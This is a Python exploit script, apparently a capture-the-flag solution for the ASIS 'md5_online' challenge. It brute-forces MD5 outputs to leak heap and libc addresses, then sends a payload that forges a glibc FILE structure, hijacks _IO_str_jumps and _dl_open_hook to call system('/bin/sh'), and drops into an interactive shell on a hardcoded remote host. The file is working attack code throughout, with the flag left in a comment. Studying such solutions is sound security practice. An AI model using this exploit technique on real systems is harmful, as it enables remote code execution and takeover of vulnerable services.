#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './md5_online.elf'
context(os = 'linux', arch = 'x86')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'76.74.177.238', 'port':9004})
env.set_item('libc',    debug   = None, \
                        local   = 'libc-2.24.so', \
                        remote  = 'libc-2.24.so')
env.set_item('fd',      debug = 3, local = 5, remote  = 3)
env.set_item('offset_libc_io_str_jumps', debug = 0x1d68c0, local = 0x1b49c0, remote = 0x1b49c0)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stderr      = libc.symbols['_IO_2_1_stderr_']

_IO_LINKED              = 0x0080

#==========

def attack(conn, **kwargs):

    hash_heap = get_md5(conn, 'a'*0x200, False)
    if env.libc is None:
        addr_heap_base = u32(find_plain(hash_heap, 'a'*0x200, [[0x9c], range(0x100), range(0x100), range(0x55, 0x58)], '')) - 0x19c
    else:
        addr_heap_base = u32(find_plain(hash_heap, 'a'*0x200, [[0x44], range(0x100), range(0x100), range(0x55, 0x58)], '\x61\x01')) - 0x44
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    if env.libc is None:
        hash_libc = get_md5(conn, 'b'*0x244, False)
        addr_libc_stderr = u32(find_plain(hash_libc, 'b'*0x244, [[offset_libc_stderr & 0xff], range(0x100), range(0x100), [0xf7]], '\x03'))
    else:
        hash_libc = get_md5(conn, 'b'*0x23c, False)
        addr_libc_stderr = u32(find_plain(hash_libc, 'b'*0x23c, [[offset_libc_stderr & 0xff], range(0x100), range(0x100), [0xf7]], chr(env.fd)))
    libc.address = addr_libc_stderr - offset_libc_stderr
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_io_str_jumps  = libc.address + env.offset_libc_io_str_jumps # libc.symbols['_IO_str_jumps']
    addr_libc_dl_open_hook  = libc.symbols['_dl_open_hook']

    addr_libc_system        = libc.sep_function['system']
    addr_libc_str_sh        = next(libc.search('/bin/sh'))
    addr_arg                = (addr_libc_str_sh+(5 if addr_libc_str_sh % 2 else 0) - 0x64) / 2

    exploit  = 'c'*0x200
    exploit += p32(addr_libc_dl_open_hook)
    if env.check('debug'):
        exploit += 'd'*0x8
    exploit += p32(0x161)
    exploit += p32(0xfbad2498 & ~_IO_LINKED)
    exploit += p32(0)*4
    exploit += p32(addr_arg + 1)
    exploit += p32(0)*2
    exploit += p32(addr_arg)
    exploit += p32(0)*5
    exploit += p(-1)
    exploit += p32(0)*3
    exploit += p32(addr_heap_base)
    exploit += p32(0)*18
    exploit += p32(addr_libc_io_str_jumps)
    exploit += p32(addr_libc_system)
    get_md5(conn, exploit, True)

def get_md5(conn, txt, use_salt):
    conn.recvuntil('Text: ')
    for s in [txt[:500], txt[500:]]:
        conn.send(s)
        sleep(0.1)

    conn.sendlineafter('[y/N] ', 'y' if use_salt else 'n')
    conn.recvuntil('MD5 (salted): ' if use_salt else 'MD5: ')
    return conn.recvuntil('\n', drop=True)

def find_plain(md5hash, salt1, r, salt2):
    for i in r[0]:
        for j in r[1]:
            for k in r[2]:
                for l in r[3]:
                    p = '%c%c%c%c' % (i,j,k,l)
                    result = hashlib.md5(salt1+p+salt2).hexdigest()
                    if result == md5hash:
                        return p
    return None

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # ASIS{byp4s51n9_vT4bl3_h1J4ck1Ng_d373ct10N!!}

#==========
